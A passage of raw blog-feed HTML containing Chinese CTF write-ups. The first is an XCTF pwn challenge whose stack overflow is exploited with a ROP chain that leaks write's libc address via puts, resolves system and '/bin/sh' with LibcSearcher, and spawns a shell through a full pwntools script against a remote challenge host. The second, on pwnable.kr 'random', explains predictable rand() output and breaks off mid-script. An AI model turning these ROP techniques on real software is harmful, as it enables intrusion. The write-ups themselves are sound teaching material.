class="string">"%s"</span>, s2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>上面的伪代码中for循环的终止条件<code>*(_BYTE *)(i + a1)</code>不是很明白，那么我们就用gdb简单的调试一下，从汇编代码中我们可以看到终止条件所对应的汇编代码为：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x400776 &lt;echo+89&gt;:  test   al,al</span><br><span class="line">0x400778 &lt;echo+91&gt;:  jne    0x400735 &lt;echo+24&gt;</span><br></pre></td></tr></table></figure><blockquote><p>可以通过调试看出，这是在比较寄存器rax中的低16位，如果低16位的ASCII值不为<code>0</code>的，也就是低16位的符号不为<code>\x00</code>的话，则跳转至0x400735，否则结束for循环。那么for的终止条件就很明确了，只要遇见<code>\x00</code>符号就退出循环。然后最后一位赋值给0。</p><p><br>到这里细心的你就会发现<code>s2</code>的空间为<code>ebp-0x10</code>，而<code>a1</code>的大小却足足有<code>0x400</code>，将<code>a1</code>赋值给<code>s2</code>就说明这里存在着栈溢出的漏洞，那么我们可以对<code>buf</code>输入的值的长度超过0x10，那么<code>s2</code>必定会产生栈溢出，下面我们就找一下栈中的情况。</p><ul><li>首先是<code>buf</code>的地址：<code>$rbp-0x400</code>得到<code>0x7fffffffe360</code>，这里的<code>rbp</code>为<code>0x7fffffffe760</code></li><li>再来确定<code>s2</code>的地址：<code>$rbp-0x10</code>得到<code>0x7fffffffe340</code>，这里的<code>rbp</code>为<code>0x7fffffffe350</code></li></ul><p>如下图所示：</p></blockquote><p><img src="/images/125-2.png" alt></p><blockquote><p><code>s2</code>和<code>buf</code>之间的地址差为<code>0x7fffffffe360-0x7fffffffe340=0x20</code>，而栈给<code>echo</code>函数分配的空间就为<code>0x20</code>，那么我们就可以画出一个简单的栈示意图，如下图：</p></blockquote><p><img src="/images/125-3.png" alt></p><blockquote><p>假设我们输入的buf大小正好是<code>0x20</code>，我们来看看栈中的情况，如下图绿色部分就是s2复制的buf的0x20的字节：</p></blockquote><p><img src="/images/125-4.png" alt></p><blockquote><p>那么我们是不是就可以利用这个使得返回地址变为我们想要返回的地方？那么下面我们就尝试一下将返回地址返回到<code>puts</code>函数，然后利用<code>puts</code>函数打印出<code>write</code>函数的<code>GOT</code>中的地址，根据64位的传参情况，我们构造如下payload：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! python3</span></span><br><span class="line"><span class="comment">#! /usr/bin/env python3</span></span><br><span class="line"><span class="comment">#! conding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">"debug"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./pwn"</span>)</span><br><span class="line">sh = process(<span class="string">"./pwn"</span>)</span><br><span class="line">pop_rdi = <span class="number">0x4008a3</span></span><br><span class="line">write_got = elf.got[<span class="string">"write"</span>]</span><br><span class="line">puts_addr = elf.symbols[<span class="string">"puts"</span>]</span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x18</span> + str(p64(pop_rdi),encoding=<span class="string">"unicode_escape"</span>) + str(p64(write_got),encoding=<span class="string">"unicode_escape"</span>) + str(p64(puts_addr),encoding=<span class="string">"unicode_escape"</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">"Welcome to RCTF\n"</span>, payload)</span><br><span class="line">print(sh.recv())</span><br></pre></td></tr></table></figure><blockquote><p>运行被阻断，从下面的过程中可以看出，是由于p64(pop_rdi)产生了截断符号造成的，导致s2只能复制buf的前0x20个字符，示意图如下：</p></blockquote><p><img src="/images/125-6.png" alt></p><blockquote><p>那么我们也就无法将<code>0x7fffffffe360</code>处的<code>write_got</code>的地址作为参数传递给寄存器<code>rdi</code>了，但是我们可以看到在<code>buf</code>存储空间上<code>p64(pop_rdi)</code>和后面的参数紧密的连接着，那么我们是不是可以执行<code>buf</code>空间的rop呢？答案当然是可以的，现在看来是需要我们将<code>ret</code>指令指向地址为<code>0x7fffffffe378</code>，那么我们可以使用<code>pop|ret</code>gadget来达到该目的，如果需要gadget的话，那么栈中发生变化，如下：</p></blockquote><p><img src="/images/125-7.png" alt></p><blockquote><p>从上面的图中可以看出，需要我们跳转的地址并不再是<code>0x7fffffffe378</code>而是<code>0x7fffffffe380</code>，<strong>所以需要pop出栈4次</strong>才能使得栈顶eip指向<code>0x7fffffffe380</code>，那么我们找一下该程序中有没有这样的gadget，通过<code>ROPgadget --binary pwn --only &quot;pop|ret&quot;</code>指令可以找到这样的gadget，如下图中的红色圈中的内容，我们选择地址为<code>0x000000000040089c</code>的gadget</p></blockquote><p><img src="/images/125-8.png" alt></p><blockquote><p>那么我们重新构造的payload为：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! python3</span></span><br><span class="line"><span class="comment">#! /usr/bin/env python3</span></span><br><span class="line"><span class="comment">#! conding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">"debug"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./pwn"</span>)</span><br><span class="line">sh = process(<span class="string">"./pwn"</span>)</span><br><span class="line">pop_ret4 = <span class="number">0x40089c</span></span><br><span class="line">pop_rdi = <span class="number">0x4008a3</span></span><br><span class="line">write_got = elf.got[<span class="string">"write"</span>]</span><br><span class="line">puts_addr = elf.symbols[<span class="string">"puts"</span>]</span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x18</span> + str(p64(pop_ret4),encoding=<span class="string">"unicode_escape"</span>) + str(p64(pop_rdi),encoding=<span class="string">"unicode_escape"</span>) + str(p64(write_got),encoding=<span class="string">"unicode_escape"</span>) + str(p64(puts_addr),encoding=<span class="string">"unicode_escape"</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">"Welcome to RCTF\n"</span>, payload)</span><br><span class="line">print(sh.recv())</span><br></pre></td></tr></table></figure><blockquote><p>那么我们怎么知道哪一个是我们想得到的<code>write_addr</code>的值呢？因为是先执行完<code>echo</code>函数中的指令，才能返回到调用函数前的返回地址，<font color="navy">由于我们只讲buf的前0x20个字节赋值给了s2，所以返回的前0x20个字符不是我们想要的，后面的才是我们想要的<code>write_addr</code>值</font>，我们可以看到接受的最后一个字符是<code>\x40</code>，这是<code>pop_ret4</code>在栈中的小端存储方式造成的，所以我们修改一下我们payload，将最后的接受的数据改为：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sh.recvuntil(<span class="string">"\x40"</span>)</span><br><span class="line">write_addr = u64(str(sh.recv(<span class="number">6</span>),encoding=<span class="string">"unicode_escape"</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line">print(<span class="string">"[*] write_addr:"</span>,hex(write_addr))</span><br></pre></td></tr></table></figure><blockquote><p>运行结果如下图，从下图中可以看出，<code>9c 08 40</code>后面就是我们想要得到的<code>write_addr</code>的值（这是由<code>puts</code>函数打印出来的）。</p></blockquote><p><img src="/images/125-10.png" alt></p><blockquote><p>我们既然已经得到了<code>write</code>的真实地址，那么我们就可以泄露出<code>system</code>和<code>/bin/sh</code>的装载时的地址，这里我们需要用到一个python库<a href="https://github.com/lieanu/LibcSearcher" target="_blank" rel="noopener"><code>LibcSearcher</code>库</a>，这是针对CTF比赛所做的小工具，在泄露了Libc中的某一个函数地址后，常常为不知道对方所使用的操作系统及libc的版本而苦恼，常规方法就是挨个把常见的Libc.so从系统里拿出来，与泄露的地址对比一下最后12位。<sup>[1]</sup>根据该库作者的提示，我们可以这样泄露出<code>write</code>函数所在Libc库中的版本，同时泄露出system和/bin/sh的偏移</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> LibcSearcher</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc是所在库的版本号</span></span><br><span class="line">libc = LibcSearcher(<span class="string">"write"</span>,write_got)<span class="comment"># write_got 就是我们上面得到的write函数的真实地址</span></span><br><span class="line"><span class="comment"># 加载时的libc基地址</span></span><br><span class="line">libc_base = write_got - libc.dump(<span class="string">"write"</span>)</span><br><span class="line"><span class="comment"># 计算system函数加载时的虚拟地址</span></span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">"system"</span>)</span><br><span class="line"><span class="comment"># 计算/bin/sh函数加载时的虚拟地址</span></span><br><span class="line">bin_sh_addr = libc_base + libc.dump(<span class="string">"str_bin_sh"</span>)</span><br></pre></td></tr></table></figure><blockquote><p>在前面leak<code>write</code>函数地址的时候，已经将程序结束运行了，那怎么再次发送我们的payload呢？在这里需要用到一个技巧，就是在打印出write函数地址后，使得返回地址为<code>main</code>函数的地址，使程序重新运行，那么我们在泄露write函数的payload就得加上一个main函数地址，如下：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">main = elf.symbols[<span class="string">"main"</span>]</span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x18</span> + str(p64(pop4_ret),encoding=<span class="string">"unicode_escape"</span>) + str(p64(pop_rdi),encoding=<span class="string">"unicode_escape"</span>) + str(p64(write_got),encoding=<span class="string">"unicode_escape"</span>) + str(p64(puts_addr),encoding=<span class="string">"unicode_escape"</span>) + str(p64(main),encoding=<span class="string">"unicode_escape"</span>)</span><br></pre></td></tr></table></figure><blockquote><p>这样我们还可以再对buf输入一次值，那么第二次输入的payload和第一次的payload没有太大的区别，只不过是换了一下地址的值，示意图如下：</p></blockquote><p><img src="/images/125-9.png" alt></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x18</span> + str(p64(pop4_ret),encoding=<span class="string">"unicode_escape"</span>) + str(p64(pop_rdi),encoding=<span class="string">"unicode_escape"</span>) + str(p64(bin_sh_addr),encoding=<span class="string">"unicode_escape"</span>) + str(p64(system_addr),encoding=<span class="string">"unicode_escape"</span>)</span><br></pre></td></tr></table></figure><h3 id="0x02-解题步骤"><a href="#0x02-解题步骤" class="headerlink" title="0x02 解题步骤"></a><font color="navy"><code>0x02 解题步骤</code></font></h3><blockquote><p>具体的解题思路可以看<code>题目分析</code>部分，这里根据上文直接给出exp：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! python3</span></span><br><span class="line"><span class="comment">#! /usr/bin/env python3</span></span><br><span class="line"><span class="comment">#! coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">pop4_ret = <span class="number">0x40089c</span></span><br><span class="line">pop_rdi = <span class="number">0x4008a3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 泄露write函数装载时的地址</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_write</span><span class="params">(r,elf)</span>:</span></span><br><span class="line">    write_got = elf.got[<span class="string">"write"</span>]</span><br><span class="line">    print(<span class="string">"[*] write_got:"</span>,hex(write_got))</span><br><span class="line">    puts_addr = elf.symbols[<span class="string">"puts"</span>]</span><br><span class="line">    print(<span class="string">"[*] puts_addr:"</span>,hex(puts_addr))</span><br><span class="line">    puts_plt = elf.plt[<span class="string">"puts"</span>]</span><br><span class="line">    print(<span class="string">"[*] puts_plt:"</span>,hex(puts_plt))</span><br><span class="line">    main = elf.symbols[<span class="string">"main"</span>]</span><br><span class="line">    print(<span class="string">"[*] main_addr:"</span>,hex(main))</span><br><span class="line">    payload = <span class="string">"a"</span>*<span class="number">0x18</span> + str(p64(pop4_ret),encoding=<span class="string">"unicode_escape"</span>) + str(p64(pop_rdi),encoding=<span class="string">"unicode_escape"</span>) + str(p64(write_got),encoding=<span class="string">"unicode_escape"</span>) + str(p64(puts_addr),encoding=<span class="string">"unicode_escape"</span>) + str(p64(main),encoding=<span class="string">"unicode_escape"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">"Welcome to RCTF\n"</span>, payload)</span><br><span class="line">    <span class="comment">#r.recvuntil('a'*(0x10+8))</span></span><br><span class="line">    r.recvuntil(<span class="string">"\x40"</span>)</span><br><span class="line">    write_addr = u64(str(r.recvn(<span class="number">6</span>),encoding=<span class="string">"unicode_escape"</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line">    print(<span class="string">"[+] write_addr:"</span>,write_addr)</span><br><span class="line">    <span class="keyword">return</span> write_addr</span><br><span class="line"></span><br><span class="line"><span class="comment"># 寻找system和/bin/sh的虚拟地址</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_system_bin_addr</span><span class="params">(write_addr,r,elf)</span>:</span></span><br><span class="line">    libc = LibcSearcher(<span class="string">"write"</span>,write_addr)</span><br><span class="line">    print(<span class="string">"[+] libc:"</span>,libc)</span><br><span class="line">    libc_base = write_addr - libc.dump(<span class="string">"write"</span>)</span><br><span class="line">    system_addr = libc_base + libc.dump(<span class="string">"system"</span>)</span><br><span class="line">    bin_sh_addr = libc_base + libc.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line">    payload = <span class="string">"a"</span>*<span class="number">0x18</span> + str(p64(pop4_ret),encoding=<span class="string">"unicode_escape"</span>) + str(p64(pop_rdi),encoding=<span class="string">"unicode_escape"</span>) + str(p64(bin_sh_addr),encoding=<span class="string">"unicode_escape"</span>) + str(p64(system_addr),encoding=<span class="string">"unicode_escape"</span>)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 主函数</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    r = remote(<span class="string">"220.249.52.133"</span>,<span class="number">30472</span>)</span><br><span class="line">    elf = ELF(<span class="string">"./pwn"</span>)</span><br><span class="line">    context(log_level=<span class="string">"debug"</span>)</span><br><span class="line">    write_addr = leak_write(r,elf)</span><br><span class="line">    find_system_bin_addr(write_addr,r,elf)</span><br></pre></td></tr></table></figure><h3 id="0x03-Reference"><a href="#0x03-Reference" class="headerlink" title="0x03 Reference"></a><font color="navy"><code>0x03 Reference</code></font></h3><p>[1] <a href="https://github.com/lieanu/LibcSearcher" target="_blank" rel="noopener">Search libc function offset</a></p><p>[2] <a href="https://blog.csdn.net/seaaseesa/article/details/102944448" target="_blank" rel="noopener">攻防世界PWN之Welpwn题解</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x00-相关知识点&quot;&gt;&lt;a href=&quot;#0x00-相关知识点&quot; class=&quot;headerlink&quot; title=&quot;0x00 相关知识点&quot;&gt;&lt;/a&gt;&lt;font color=&quot;navy&quot;&gt;&lt;code&gt;0x00 相关知识点&lt;/code&gt;&lt;/font&gt;&lt;/h3&gt;&lt;h
      
    
    </summary>
    
      <category term="Binary" scheme="https://muzibing.github.io/categories/Binary/"/>
    
    
      <category term="XCTF" scheme="https://muzibing.github.io/tags/XCTF/"/>
    
      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Pwnable.kr的奇幻之旅（六）[random]</title>
    <link href="https://muzibing.github.io/2020/06/09/2020.06.09%EF%BC%88124%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/06/09/2020.06.09（124）/</id>
    <published>2020-06-08T16:00:00.000Z</published>
    <updated>2020-06-09T06:38:36.468Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-colornavy0x00-相关知识点font"><a class="markdownIt-Anchor" href="#font-colornavy0x00-相关知识点font"></a> <font color="navy"><code>0x00 相关知识点</code></font></h3><h4 id="font-color-blue1rand函数的伪随机font"><a class="markdownIt-Anchor" href="#font-color-blue1rand函数的伪随机font"></a> <font color="blue"><code>1.rand()函数的“伪随机”</code></font></h4><p>      首先我们根据一个程序来认识<code>rand()</code>函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a,i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)&#123;</span><br><span class="line">        a = rand();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"a%d = %d\n"</span>,i,a);</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>      我们多次运行该程序会得到如下结果：</p><p><img src="/images/124-1.png" alt></p><p>      我们可以从上面的结果可以看出不同的运行，产生的5个结果都是相对等的，这就说明了rand()函数产生的是伪随机数，这是由于rand函数内部**是通过一个公式计算出一个值作为随机值，下次再调用rand的时候，再把这个随机值作为参数传给这个公式计算出一个新的随机值，周而复始。**比如下方的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> next=<span class="number">1</span>;     <span class="comment">//静态全局变量，作为种子</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* RAND_MAX assumed to be 32767 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">myrand</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    next = next * <span class="number">1103515245</span> + <span class="number">12345</span>;</span><br><span class="line">    <span class="keyword">return</span>((<span class="keyword">unsigned</span>)(next/<span class="number">65536</span>) % <span class="number">32768</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>可以看出，在这里<code>next</code>变量在这里相当于一个<code>seed</code>，因为程序只要重新开始运行，“种子”值就会被默认赋值为1，那么通过公式算出来的数值肯定就一直相同了。那么下面我们就要引入<code>srand()</code>函数，现在在我们的代码的基础上，添加srand()函数，看一下运行结果如何，代码如下：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a,i;</span><br><span class="line">    srand(time(<span class="literal">NULL</span>));<span class="comment">// 设置随机数种子</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">           a = rand();</span><br><span class="line">           <span class="built_in">printf</span>(<span class="string">"a%d = %d\n"</span>,i,a);</span><br><span class="line">           sleep(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>运行结果如下：</p></blockquote><p><img src="/images/124-2.png" alt></p><blockquote><p><code>time(NULL)</code>是指返回从1970年1.1日（元旦）午夜0点到现在的秒数，对于srand的输入每次都会不同，那么<code>rand()</code>和<code>srand()</code>的实现原理如下：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> next = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* RAND_MAX assumed to be 32767 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">myrand</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    next = next * <span class="number">1103515245</span> + <span class="number">12345</span>;</span><br><span class="line">    <span class="keyword">return</span>((<span class="keyword">unsigned</span>)(next/<span class="number">65536</span>) % <span class="number">32768</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mysrand</span><span class="params">(<span class="keyword">unsigned</span> seed)</span> </span>&#123;</span><br><span class="line">    next = seed;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>如果<code>mysrand</code>函数的参数是<code>time(NULL)</code>，也就是说<code>rand</code>函数每次运行时的种子是不同的，因此产生的随机数序列就不会相同了，但是这种是<code>伪随机数</code>，是可以预测的。要注意上面的并不是c库中的源码，下面给出c库中的源码：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cruntime.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mtdll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __<span class="function">cdecl <span class="title">srand</span> <span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">unsigned</span> <span class="keyword">int</span> seed</span></span></span><br><span class="line"><span class="function"><span class="params">        )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        _getptd()-&gt;_holdrand = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)seed;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">rand</span> <span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">void</span></span></span></span><br><span class="line"><span class="function"><span class="params">        )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        _ptiddata ptd = _getptd();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span>( ((ptd-&gt;_holdrand = ptd-&gt;_holdrand * <span class="number">214013L</span></span><br><span class="line">            + <span class="number">2531011L</span>) &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0x7fff</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="font-color-navy0x01-题目分析font"><a class="markdownIt-Anchor" href="#font-color-navy0x01-题目分析font"></a> <font color="navy"><code>0x01 题目分析</code></font></h3><p>      查看题目中给出的源码，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> random;</span><br><span class="line">        random = rand();        <span class="comment">// random value!</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> key=<span class="number">0</span>;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;key);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>( (key ^ random) == <span class="number">0xdeadbeef</span> )&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Good!\n"</span>);</span><br><span class="line">                system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Wrong, maybe you should try 2^32 cases.\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>      下面我们来详细的分析一下上述程序：</p><blockquote><ol><li>首先用<code>rand</code>函数设置一个伪随机数，但是没有用<code>srand</code>函数对种子进行初始化；</li><li>需要我们输入一个key变量；</li><li>将输入的key与生成的伪随机数进行异或，判断是否与0xdeadbeef值相等，如果相等就打印出<code>flag</code></li></ol></blockquote><p>      通过上述的分析，我们发现要想成功的打印出flag就必须使得我们输入的值与伪随机数异或以后的值为0xdeadbeef，在这里我们还应该要清楚异或的性质：a ⊕ b = c，那么 b = a ⊕ c，所以说 <code>key = random ⊕ 0xdeadbeef</code>，所以我们只需要知道random的值是多少即可求出key</p><h3 id="font-color-navy0x02-解题步骤font"><a class="markdownIt-Anchor" href="#font-color-navy0x02-解题步骤font"></a> <font color="navy"><code>0x02 解题步骤</code></font></h3><h4 id="font-color-blue1写出脚本算出key值font"><a class="markdownIt-Anchor" href="#font-color-blue1写出脚本算出key值font"></a> <font color="blue"><code>1.写出脚本，算出key值</code></font></h4><p>      根据我们上文的分析，可以写出一个小的程序，来计算我们要求的key，脚本如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span 